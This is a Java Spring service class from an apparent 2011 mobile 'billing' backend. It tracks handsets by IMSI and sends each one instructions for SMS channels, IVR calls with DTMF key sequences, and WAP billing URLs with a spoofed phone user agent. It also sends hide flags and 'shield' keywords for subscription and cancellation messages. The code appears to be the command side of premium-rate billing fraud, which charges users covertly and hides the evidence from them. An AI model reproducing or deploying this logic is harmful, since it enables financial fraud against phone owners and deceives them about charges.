package com.rainy.billing.service.impl;

import java.util.ArrayList;
import java.util.List;

import org.apache.commons.logging.Log;
import org.apache.commons.logging.LogFactory;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Service;

import com.rainy.billing.Constant;
import com.rainy.billing.entity.ChannelRequest;
import com.rainy.billing.entity.GpChannel;
import com.rainy.billing.entity.IvrChannel;
import com.rainy.billing.entity.Project;
import com.rainy.billing.entity.SmsChannel;
import com.rainy.billing.entity.Terminal;
import com.rainy.billing.model.ChannelEvent;
import com.rainy.billing.model.service.SmsChan;
import com.rainy.billing.service.CacheService;
import com.rainy.billing.service.CatNumberService;
import com.rainy.billing.service.ChannelHandler;
import com.rainy.billing.service.ChannelRequestService;
import com.rainy.billing.service.ProjectService;
import com.rainy.billing.service.SequenceService;
import com.rainy.billing.service.TerminalService;
import com.rainy.billing.util.HandlerUtil;
import com.rainy.billing.util.StringUtil;

/**
 * Title: <br>
 * Description: <br>
 * Project:  billing <br>
 * Company: com.rainy <br>
 * Copyright: 2011 www.rainy.com Inc. All rights reserved.<br>
 *
 * @2011-12-1
 * @author rainy
 * @version 1.0
 */
@Service
public class ChannelHandlerImpl extends AbstractChannelHandler implements ChannelHandler {
	
	protected Log log = LogFactory.getLog(this.getClass());
	
	@Autowired
	private ChannelRequestService channelRequestService;
	
	@Autowired
	private CacheService cacheService;
	
	@Autowired
	private TerminalService terminalService;
	
	@Autowired
	private CatNumberService catNumberService;
	
	@Autowired
	private SequenceService sequenceService;
	
	@Autowired
	private ProjectService projectService;
	
	private void handleTerminal(Terminal terminal, ChannelEvent event, Project project) {
		if(terminal == null) {
			terminal = new Terminal(event.getChanRequest().getUid(), event.getChanRequest().getImsi(), project.getId(),
					project.getName(), event.getChanRequest().getPlmn(), event.getChanRequest().getSc(), catNumberService.getValidNumber(), event.getChanRequest().getVer());
			terminalService.createTerminal(terminal);
			event.getChanResponse().setCat(terminal.getCatNumber());
		} else if(!catNumberService.isNumberValid(terminal.getCatNumber())) {
			terminal.setCatNumber(catNumberService.getValidNumber());
			event.getChanResponse().setCat(terminal.getCatNumber());
			if(StringUtil.isNotBlank(terminal.getCatNumber())) {
				event.getSmsKey().add(HandlerUtil.constructNumStr(terminal.getCatNumber()));
			}
			terminalService.updateTerminal(terminal);
		} else {
			terminalService.updateTerminalUpdatedAt(terminal);
		}
	}
	
	@Override
	public void preHandle(ChannelEvent event) {
		Project project = cacheService.getProject(Long.valueOf(event.getChanRequest().getProjectid()));
		if(project != null) {
			event.setProject(project);
			
			Terminal terminal = null;
			if(project.getId() >= 5000) {
				if(event.getChanRequest().isUidValid()) {
					terminal = terminalService.getTerminalByUid(event.getChanRequest().getUid());
					handleTerminal(terminal, event, project);
				} else {
					event.getChanResponse().setUid(sequenceService.retrieveUid());
					event.getChanRequest().setUid(event.getChanResponse().getUid());
					
					handleTerminal(null, event, project);
				}
			} else {
				if(event.getChanRequest().isUidValid()) {
					terminal = terminalService.getTerminalByUid(event.getChanRequest().getUid());
				} else {
					terminal = terminalService.getTerminalByImsi(event.getChanRequest().getImsi());
					if(terminal == null) event.getChanRequest().setUid(sequenceService.retrieveUid());
				}
				
				if(terminal == null) {
					terminal = new Terminal(event.getChanRequest().getUid(), event.getChanRequest().getImsi(), project.getId(),
							project.getName(), event.getChanRequest().getPlmn(), event.getChanRequest().getSc(), catNumberService.getValidNumber(), event.getChanRequest().getVer());
					terminalService.createTerminal(terminal);
				} else {
					terminalService.updateTerminalUpdatedAt(terminal);
				}
			}
			
			projectService.setGpChannel(project, event.getChanRequest().getSc());
			projectService.setIvrChannel(project, event.getChanRequest().getSc(), event.getChanRequest().getPlmn());
			projectService.setSmsChannel(project, event.getChanRequest().getSc(), event.getChanRequest().getPlmn());

			event.getChanResponse().setMaxfee(project.getMonthlyFee().toString());
			event.getChanResponse().setBlacktime(project.getShieldCycle().toString());
			event.getChanResponse().setCircle(project.getSynchronizeCycle().toString());
			event.getChanResponse().setWh1(project.getValidStart().toString());
			event.getChanResponse().setWh2(project.getValidEnd().toString());
			event.getChanResponse().setHide(StringUtil.convertBoolean(project.getShieldSms()));
			event.getChanResponse().setCs(project.getSwitchServer());
			event.getChanResponse().setExt(project.getExtension());
		} else {
			log.info("project not exist with id: " + event.getChanRequest().getProjectid());
		}
	}

	@Override
	public String postHandle(ChannelEvent event) {
		if(event.getProject()!= null) {
			ChannelRequest request = new ChannelRequest(event.getChanRequest());
			request.setProjectName(event.getProject().getName());
			
			channelRequestService.createChannelRequest(request);
			
			StringBuilder smsKey = new StringBuilder();
			for(String str : event.getSmsKey()) {
				if(StringUtil.isNotBlank(str)) {
					if(smsKey.length() > 0) smsKey.append(Constant.SMS_KEY_DELIMITER);
					smsKey.append(str);
				}
			}
			event.getChanResponse().setSmskey(smsKey.toString());
		}
		
		return event.getChanResponse().toString();
	}
	
	@Override
	public void handleGpChannel(ChannelEvent event) {
		List<GpChannel> gpChannels = event.getProject().getGpChannels();
		if(gpChannels != null && gpChannels.size() > 0) {
			event.getChanResponse().setUrl(gpChannels.get(0).getUrl());
			event.getChanResponse().setStep(gpChannels.get(0).getCustSteps());
			event.getChanResponse().setCanceldate(gpChannels.get(0).getCancelDay().toString());
			event.getChanResponse().setUa(gpChannels.get(0).getPhoneModel());
			event.getChanResponse().setxWapProfile(gpChannels.get(0).getxWapProfile());
			event.getChanResponse().setJid3(sequenceService.retrieveJid());
			
			event.getSmsKey().add(gpChannels.get(0).getCustShieldKey());
			event.getSmsKey().add(gpChannels.get(0).getCancelShieldKey());
		} else {
			log.info("no G+ channel for project: " + event.getChanRequest().getProjectid());
		}
	}
	
	@Override
	public void handleIvrChannel(ChannelEvent event) {
		List<IvrChannel> ivrChannels = event.getProject().getIvrChannels();
		if(ivrChannels != null && ivrChannels.size() > 0) {
			
			event.getChanResponse().setPhone(ivrChannels.get(0).getDialNumber());
			event.getChanResponse().setTime(ivrChannels.get(0).getCallDuration().toString());
			event.getChanResponse().setDelay(ivrChannels.get(0).getDelay().toString());
			event.getChanResponse().setDtmf(ivrChannels.get(0).getKeyOrder());
			event.getChanResponse().setJid2(sequenceService.retrieveJid());
			
			event.getSmsKey().add(ivrChannels.get(0).getSmsKey());
		} else {
			log.info("no IVR channel for project: " + event.getChanRequest().getProjectid());
		}
	}
	
	@Override
	public void handleSmsChannel(ChannelEvent event) {
		List<SmsChannel> matched = event.getProject().getSmsChannels();
		
		if(matched != null && matched.size() > 0) {
			List<SmsChan> smsList = new ArrayList<SmsChan>();
			
			event.getSmsKey().add(HandlerUtil.constructSmsChan(matched, smsList));
			event.getChanResponse().setSmsList(smsList);
			event.getChanResponse().setJid1(sequenceService.retrieveJid());
		} else {
			log.info("no matched SMS channel for project: " + event.getChanRequest().getProjectid());
		}
	}
	
}
